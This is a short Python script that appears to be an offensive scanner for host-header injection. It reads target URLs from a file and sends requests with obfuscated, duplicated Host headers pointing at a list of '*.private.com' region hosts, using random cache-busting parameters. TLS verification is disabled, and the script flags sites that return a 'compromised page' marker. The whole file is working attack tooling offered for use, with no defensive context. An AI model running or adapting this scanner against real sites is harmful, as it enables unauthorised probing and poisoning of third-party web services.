import requests
import warnings
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore',InsecureRequestWarning)

regions = ["us-east-2.private.com",
"us-east-1.private.com",
"us-west-1.private.com",
"us-west-2.private.com",
"ap-south-1.private.com",
"ap-northeast-3.private.com",
"ap-northeast-2.private.com",
"ap-southeast-1.private.com",
"ap-southeast-2.private.com",
"ca-central-1.private.com",
"eu-central-1.private.com",
"eu-west-1.private.com",
"eu-west-2.private.com",
"eu-west-3.private.com",
"eu-north-1.private.com",
"sa-east-1.private.com",
"me-south-1.private.com",
"ap-east-1.private.com",
"ap-northeast-1.private.com"]

urls = open("urllist.txt","r").read().strip().split("\n")

for url in urls:
    for region in regions:
        rand=random.randrange(1, 1000000, 1)
        req=requests.get(url+"/index.html?youcannotguessme"+str(rand)+"="+str(rand), headers={"\x1dHost":region,"%20Host":region,"Host": region+ "%40"+region}, verify=False, allow_redirects=False)
        if "<h1>This compromised page</h1>" in req.text:
            print(url, region)
